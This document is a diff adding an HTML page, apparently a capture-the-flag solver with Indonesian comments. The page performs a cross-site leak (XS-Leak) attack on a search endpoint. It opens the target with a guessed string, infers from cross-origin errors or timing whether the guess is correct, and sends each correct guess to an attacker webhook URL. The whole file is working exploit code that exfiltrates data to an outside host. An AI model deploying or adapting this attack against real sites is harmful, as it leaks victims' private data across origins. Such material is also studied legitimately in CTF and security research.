@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XS-Leak Solver</title>
+</head>
+<body>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const guess = params.get("g");
+        const webhook = "https://webhook.site/YOUR_ID"; // GANTI DENGAN ID ANDA
+        const target = "https://ponder.cbd2026.cloud/search?q=" + encodeURIComponent(guess);
+
+        const start = performance.now();
+        const win = window.open(target);
+
+        // XS-Leak via Timing/Cross-Origin State
+        setTimeout(() => {
+            const end = performance.now();
+            const duration = end - start;
+
+            try {
+                // Jika redirect terjadi ke /raw, origin akan berubah atau durasi load berbeda
+                if (win.location.origin === "https://ponder.cbd2026.cloud") {
+                    // Masih di halaman search (Berarti karakter SALAH)
+                }
+            } catch (e) {
+                // Jika terjadi Cross-Origin Error, besar kemungkinan redirect berhasil
+                // karena browser memblokir akses ke origin baru (Berarti karakter BENAR)
+                fetch(`${webhook}?found=${guess}`);
+            }
+            win.close();
+        }, 1200); // Sesuaikan delay dengan latensi server ponder
+    </script>
+</body>
+</html>
